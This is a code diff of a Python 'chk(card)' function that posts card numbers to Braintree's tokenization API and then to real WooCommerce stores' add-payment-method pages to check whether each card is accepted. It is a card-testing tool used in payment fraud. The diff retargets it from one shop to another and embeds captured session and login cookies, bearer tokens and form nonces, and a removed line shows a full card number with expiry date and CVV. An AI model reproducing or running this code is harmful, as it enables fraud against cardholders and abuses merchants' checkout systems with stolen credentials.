@@ -20,11 +20,14 @@ def chk(card):
 	
 	r = requests.session()
 	
-	r.verify = False
-	
-	user = user_agent.generate_user_agent()
-	
-	
+
+
+
+
+
+
+
+
 
 
 
@@ -33,7 +36,7 @@ def chk(card):
     'authority': 'payments.braintree-api.com',
     'accept': '*/*',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjAzOTM2MTYsImp0aSI6ImNkNzRlZTI5LTgzYTAtNDZjYy05ZGQ4LTEzNTczNGI1YWY0NiIsInN1YiI6InF6bjdiNTl6enJxN2duMzkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InF6bjdiNTl6enJxN2duMzkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoicmVsZW50bGVzc2RlZmVuZGVyYXBwYXJlbF9pbnN0YW50In19.r4cgbfhUleX1V8QfvenoYFs63vwALLU0h2xOH_p67ubUwV0Cp9I4QARpihsTOhZ4Pe51vl3aPqXPkKjJ1owYHw',
+    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjA0NDk5MTIsImp0aSI6IjU3ZjkzZTA1LTc5NDEtNDIzMS1iMzQ0LTIzM2EwNTc1ZTkyMCIsInN1YiI6Inc5bnI1cHM2anluZGZ3Z24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Inc5bnI1cHM2anluZGZ3Z24iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.FFtCLckiTmClRLCdSLvIFJrnotu3cVU8RejH8yDDGAMFf3eRWNnCdhyH_pts-HXXtEYTKJwKQCEnYTRJJJrLDA',
     'braintree-version': '2018-05-10',
     'cache-control': 'no-cache',
     'content-type': 'application/json',
@@ -52,8 +55,8 @@ def chk(card):
 	json_data = {
     'clientSdkMetadata': {
         'source': 'client',
-        'integration': 'dropin2',
-        'sessionId': 'dcf94f8f-f32c-455f-b554-c309b8758403',
+        'integration': 'custom',
+        'sessionId': 'adf590ff-27fb-4d0c-b743-3b6586ddb7ed',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -74,58 +77,52 @@ def chk(card):
 
 	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
 
-# Note: json_data will not be serialized by requests
-# exactly as it was in the original request.
-#data = '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"dcf94f8f-f32c-455f-b554-c309b8758403"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5285460026338112","expirationMonth":"06","expirationYear":"2027","cvv":"418"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
-#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
+
 	tok = response.json()['data']['tokenizeCreditCard']['token']
-	
-	
-	
-	
-	
+
+
+
+
+
+
+
 
 
 
 
 
 	cookies = {
-    'cf_chl_rc_ni': '2',
-    'cf_clearance': 'xo5mMdjK3DVyDl4OV7zTiw9rOzUZsYfEJjCgiiFISW4-1720306284-1.0.1.1-lP_BtNom0ByBauQsS1aQTf_6hkCZDcAjOi2UaJkgiheXeufGOyCfc3w4EeMUVQvd.H0nJOHtowGkrkqYrAGAEw',
-    'l7euahzp': 'nzmc2gtk5761',
-    '5y4395rb': '8f9dl4rpfwqz',
-    'g2u0cqio': 'yjbw5a946jn1',
+    '_ga': 'GA1.1.242160314.1719582147',
+    'eucookielaw': '1735134150572',
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2024-07-06%2022%3A51%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%3F__cf_chl_tk%3DsB84g1FeE3TV6_1m.nBHKPnk4KeIghwtaYE_fS0OYJc-1720306284-0.0.1.1-3582',
-    'sbjs_first_add': 'fd%3D2024-07-06%2022%3A51%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%3F__cf_chl_tk%3DsB84g1FeE3TV6_1m.nBHKPnk4KeIghwtaYE_fS0OYJc-1720306284-0.0.1.1-3582',
+    'sbjs_current_add': 'fd%3D2024-07-07%2014%3A39%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fproduct%2Fa-step-forward-for-tilly%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_first_add': 'fd%3D2024-07-07%2014%3A39%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fproduct%2Fa-step-forward-for-tilly%2F%7C%7C%7Crf%3D%28none%29',
     'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    '_fbp': 'fb.1.1720306317955.387839886745312118',
-    'emotiveio': 'JS-1522-1211037015',
-    'wordpress_logged_in_458d4ca3bc4f7f1cca967894c172ad61': 'moh5527vbnm%7C1721516718%7CNw1WZBml7jzWUxUwXV1Nzoiv4yceh6ib5i1sO0y5gkQ%7C287a7b22910c57a6590030cd995c6b18e6b763bcd3fe53beef1ba8a173c419ad',
-    'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%2F',
+    'wordpress_test_cookie': 'WP%20Cookie%20check',
+    'wordpress_logged_in_8f9b66474434421691b2f5f503bb4c29': 'bbxbcbb.hhxbfbb-2311%7C1721572901%7C8FiqOtOoqlwXdwqf9DJj34mdEl9NtfDfEVuGcMpt4Zt%7C1d0cc73d698c6b41e61caaf39d23d573a7ef35af5d429bb17848da9f5210c80f',
+    'wp_woocommerce_session_8f9b66474434421691b2f5f503bb4c29': '207%7C%7C1720536059%7C%7C1720532459%7C%7Cf4bfeaef5f2e3c0ec248852a6134f0ca',
+    'tk_ai': 'jetpack%3Af%2BpZuxX%2F5YXDwM1DS1Hc8s%2Bp',
+    'wfwaf-authcookie-a93ed5df29f1287f22c954ebbd632197': '207%7Cother%7Cread%7C04be1382d0f8c9596c64fffa1d98c28b2a67526603abb01471595b7c766da545',
+    '_ga_EX1GV7CW1V': 'GS1.1.1720363240.2.1.1720363304.0.0.0',
+    '_ga_347410393': 'GS1.1.1720362974.8.1.1720363304.0.0.0',
+    'sbjs_session': 'pgs%3D20%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F',
 }
 
 	headers = {
-    'authority': 'relentlessdefender.com',
+    'authority': 'www.carolyngibbsquilts.co.uk',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'no-cache',
     'content-type': 'application/x-www-form-urlencoded',
-    # 'cookie': 'cf_chl_rc_ni=2; cf_clearance=xo5mMdjK3DVyDl4OV7zTiw9rOzUZsYfEJjCgiiFISW4-1720306284-1.0.1.1-lP_BtNom0ByBauQsS1aQTf_6hkCZDcAjOi2UaJkgiheXeufGOyCfc3w4EeMUVQvd.H0nJOHtowGkrkqYrAGAEw; l7euahzp=nzmc2gtk5761; 5y4395rb=8f9dl4rpfwqz; g2u0cqio=yjbw5a946jn1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-06%2022%3A51%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%3F__cf_chl_tk%3DsB84g1FeE3TV6_1m.nBHKPnk4KeIghwtaYE_fS0OYJc-1720306284-0.0.1.1-3582; sbjs_first_add=fd%3D2024-07-06%2022%3A51%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%3F__cf_chl_tk%3DsB84g1FeE3TV6_1m.nBHKPnk4KeIghwtaYE_fS0OYJc-1720306284-0.0.1.1-3582; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _fbp=fb.1.1720306317955.387839886745312118; emotiveio=JS-1522-1211037015; wordpress_logged_in_458d4ca3bc4f7f1cca967894c172ad61=moh5527vbnm%7C1721516718%7CNw1WZBml7jzWUxUwXV1Nzoiv4yceh6ib5i1sO0y5gkQ%7C287a7b22910c57a6590030cd995c6b18e6b763bcd3fe53beef1ba8a173c419ad; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%2F',
-    'origin': 'https://relentlessdefender.com',
+    # 'cookie': '_ga=GA1.1.242160314.1719582147; eucookielaw=1735134150572; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-07%2014%3A39%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fproduct%2Fa-step-forward-for-tilly%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-07%2014%3A39%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fproduct%2Fa-step-forward-for-tilly%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_8f9b66474434421691b2f5f503bb4c29=bbxbcbb.hhxbfbb-2311%7C1721572901%7C8FiqOtOoqlwXdwqf9DJj34mdEl9NtfDfEVuGcMpt4Zt%7C1d0cc73d698c6b41e61caaf39d23d573a7ef35af5d429bb17848da9f5210c80f; wp_woocommerce_session_8f9b66474434421691b2f5f503bb4c29=207%7C%7C1720536059%7C%7C1720532459%7C%7Cf4bfeaef5f2e3c0ec248852a6134f0ca; tk_ai=jetpack%3Af%2BpZuxX%2F5YXDwM1DS1Hc8s%2Bp; wfwaf-authcookie-a93ed5df29f1287f22c954ebbd632197=207%7Cother%7Cread%7C04be1382d0f8c9596c64fffa1d98c28b2a67526603abb01471595b7c766da545; _ga_EX1GV7CW1V=GS1.1.1720363240.2.1.1720363304.0.0.0; _ga_347410393=GS1.1.1720362974.8.1.1720363304.0.0.0; sbjs_session=pgs%3D20%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F',
+    'origin': 'https://www.carolyngibbsquilts.co.uk',
     'pragma': 'no-cache',
-    'referer': 'https://relentlessdefender.com/my-account/add-payment-method/',
+    'referer': 'https://www.carolyngibbsquilts.co.uk/my-account/add-payment-method/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-arch': '""',
-    'sec-ch-ua-bitness': '""',
-    'sec-ch-ua-full-version': '"124.0.6327.4"',
-    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
     'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"23053RN02A"',
     'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"14.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
@@ -134,29 +131,36 @@ def chk(card):
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 }
 
-	data = {
-    'payment_method': 'braintree_cc',
-    'braintree_cc_nonce_key': tok,
-    'braintree_cc_device_data': '',
-    'braintree_cc_3ds_nonce_key': '',
-    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/qzn7b59zzrq7gn39/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/qzn7b59zzrq7gn39"},"merchantId":"qzn7b59zzrq7gn39","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["American Express","Visa","MasterCard","Discover","JCB","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"Relentless Defender Apparel","clientId":"ARDQ8mrbzzHppQJSRz7mnPqlpACL0XxOpSF-HRcWOym0Cg3OLuRwzbg2P9BorJhd7LxLjKKMZqFvwVQO","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"relentlessdefenderapparel_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
-    'woocommerce-add-payment-method-nonce': '2fdd3dfa35',
-    '_wp_http_referer': '/my-account/add-payment-method/',
-    'woocommerce_add_payment_method': '1',
-}
+	data = [
+    ('wc_braintree_paypal_payment_nonce', ''),
+    ('wc_braintree_device_data', '{"correlation_id":"377cae923fd33217b1f7339a604c425c"}'),
+    ('wc-braintree-paypal-context', 'shortcode'),
+    ('wc_braintree_paypal_amount', '0.00'),
+    ('wc_braintree_paypal_currency', 'GBP'),
+    ('wc_braintree_paypal_locale', 'en_gb'),
+    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
+    ('payment_method', 'braintree_credit_card'),
+    ('wc-braintree-credit-card-card-type', 'visa'),
+    ('wc-braintree-credit-card-3d-secure-enabled', ''),
+    ('wc-braintree-credit-card-3d-secure-verified', ''),
+    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
+    ('wc_braintree_credit_card_payment_nonce',tok,),
+    ('wc_braintree_device_data', '{"correlation_id":"377cae923fd33217b1f7339a604c425c"}'),
+    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
+    ('woocommerce-add-payment-method-nonce', 'c3f7c25cab'),
+    ('_wp_http_referer', '/my-account/add-payment-method/'),
+    ('woocommerce_add_payment_method', '1'),
+]
 
 	response = requests.post(
-    'https://relentlessdefender.com/my-account/add-payment-method/',
+    'https://www.carolyngibbsquilts.co.uk/my-account/add-payment-method/',
     cookies=cookies,
     headers=headers,
     data=data,
 )
-	
-	
 	text = response.text
 	
 	pattern = r'Status code (.*?)\s*</li>'
-	
 	
 	match = re.search(pattern, text)
 	if match:
@@ -169,6 +173,7 @@ def chk(card):
 		else:
 			result = "Error"
 			
-	
-				
 	return result
+	
+
+	
